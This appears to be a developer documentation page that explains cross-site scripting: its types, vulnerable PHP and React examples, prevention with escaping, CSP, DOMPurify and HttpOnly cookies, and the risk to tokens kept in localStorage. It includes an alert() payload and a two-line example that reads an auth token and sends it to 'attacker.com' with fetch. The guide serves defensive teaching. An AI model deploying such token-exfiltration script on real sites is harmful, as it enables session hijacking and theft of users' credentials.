---
title: XSS (Cross-Site Scripting)
sidebar_position: 5
---

# XSS (Cross-Site Scripting)

## Cross-Site Scripting (XSS)

---

## 1. What is XSS?

Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into webpages viewed by other users. These scripts execute in the user's browser and can steal sensitive data, hijack sessions, impersonate users, or perform malicious actions.

---

## 2. When does XSS occur?

XSS typically happens when:

* Applications accept and render untrusted user input without proper validation or escaping.

* Data from users is inserted directly into HTML, JavaScript, or the DOM.

* Unsafe rendering practices are used.

Common scenarios include:

* Comment sections

* Search fields

* User profile pages

* URL parameters

---

## 3. How does XSS happen?

Attackers craft malicious input containing executable scripts.  
 Types of XSS attacks include:

* **Stored XSS**:  
   The malicious script is permanently stored (e.g., in a database) and served to other users.

* **Reflected XSS**:  
   The malicious input is immediately reflected by the server in the response (e.g., search result page).

* **DOM-based XSS**:  
   The vulnerability exists in the frontend code itself (client-side JavaScript), where user input is read and written insecurely to the DOM.

---

## 4. Why is XSS dangerous?

* **Data theft**: Access to cookies, tokens, and sensitive user information.

* **Session hijacking**: Attacker impersonates users.

* **Malware delivery**: Inject malicious downloads or redirects.

* **Defacement**: Modify how the site appears to users.

* **Loss of user trust**: Severe reputational and financial damage.

---

## 5. Example

### Generic Web Application Example

php  
```text
<div>Welcome, <?php echo $_GET['name']; ?>!</div>
```

If a user inputs:

```js
?name=<script>alert('XSS')</script>
```

The script will execute in the victim’s browser.

---

### ReactJS Example

By default, React escapes values in JSX:

```jsx
const name = "<script>alert('XSS')</script>";
return <div>{name}</div>;
```

React renders it safely as text:  
 `<div>&lt;script&gt;alert('XSS')&lt;/script&gt;`

---

⚠️ But **dangerous use** of `dangerouslySetInnerHTML` can cause XSS:

```jsx
return <div dangerouslySetInnerHTML={{ __html: name }} />;
```

If unsanitized, this will directly inject and execute the script.

---

## 6. 🛡️ How to Prevent/Fix XSS

---

### 6.1. In a Generic Web Application

* **Escape Output**:  
   Always escape user inputs before rendering them into HTML, JavaScript, or attributes.

* **Validate and Sanitize Inputs**:  
   Strictly validate incoming data. Sanitize it based on context (text, URL, number, etc.).

**Use Content Security Policy (CSP)**:  
 Configure a CSP header to restrict which scripts can run.

 Example:

 pgsql  
```text
Content-Security-Policy: default-src 'self';
```

*   
* **Set HTTP-only Cookies**:  
   Cookies storing session data should be HTTP-only to prevent JavaScript access.

* **Use Trusted Security Libraries**:

  * OWASP Java Encoder

  * HtmlPurifier (PHP)

  * Others depending on backend stack

---

### 6.2. In ReactJS

* **Rely on React's automatic escaping**:  
   React automatically escapes content rendered in JSX.

* **Avoid `dangerouslySetInnerHTML`**:  
   Only use it when absolutely necessary.

**If needed, sanitize content using libraries like `DOMPurify`**:

```jsx
import DOMPurify from 'dompurify';

const safeHTML = DOMPurify.sanitize(userInput);
return <div dangerouslySetInnerHTML={{ __html: safeHTML }} />;
```

*   
* **Validate/Sanitize Backend Data**:  
   React frontend should not assume backend data is safe.

* **Implement CSP Headers**:  
   Configure your server to send CSP headers even for Single Page Applications (SPA) like React.

---

## 7. ✅ Summary

| Aspect | Generic Web App | ReactJS |
| ----- | ----- | ----- |
| Escape Outputs | Yes | JSX auto-escapes |
| Input Validation | Yes | Backend \+ Frontend |
| Sanitize Content | Yes | Use DOMPurify for `dangerouslySetInnerHTML` |
| Use CSP | Yes | Yes |
| Avoid Dangerous APIs | Yes (e.g., `eval()`) | Yes (`dangerouslySetInnerHTML`) |

---

## 📚 Can XSS Attack LocalStorage?

---

## 1. Quick Answer

* **XSS does not directly attack localStorage.**

* However, **if XSS is present in your app**, attackers can **use injected scripts** to:

  * **Read sensitive data** stored in `localStorage`

  * **Modify localStorage values**

  * **Exfiltrate data** to an external server

---

## 2. How It Happens

* Applications often store sensitive information (like JWT tokens) in `localStorage`.

* If an attacker injects malicious JavaScript via an XSS vulnerability, they can access `localStorage` easily.

* Since localStorage is **accessible by any JavaScript** running on the page, malicious scripts can **steal or tamper** with the data.

---

## 3. Example Attack

```js
const token = localStorage.getItem("authToken");
fetch("https://attacker.com/steal?token=" + token);
```

This malicious script reads the user's authentication token and sends it to the attacker's server.

---

## 4. Why is This Dangerous?

* Theft of **authentication tokens**.

* **Session hijacking** (impersonating users).

* **Data tampering** inside the app.

---

## 5. How to Protect

✅ **Prevent XSS**:

* Always sanitize, validate, and escape user inputs.

* Implement strong **Content Security Policies (CSP)**.

✅ **Avoid Storing Critical Data in LocalStorage**:

* Prefer **HttpOnly cookies** for authentication tokens (they are inaccessible via JavaScript).

✅ **Secure Storage Practices**:

* If you must use localStorage, encrypt sensitive data (though encryption alone is not enough without solving XSS).

---

## 6. Key Takeaways

| Question | Answer |
| ----- | ----- |
| Can XSS exploit localStorage? | ✅ Yes |
| Is localStorage itself vulnerable? | ❌ No (but easily exploitable if XSS exists) |
| How to stay safe? | Prevent XSS \+ Avoid storing sensitive data in localStorage |

---

## ✅ Final Tip:

"**Prevent XSS first. Secure localStorage second.**"  
 Without fixing XSS, localStorage will always be an easy target.
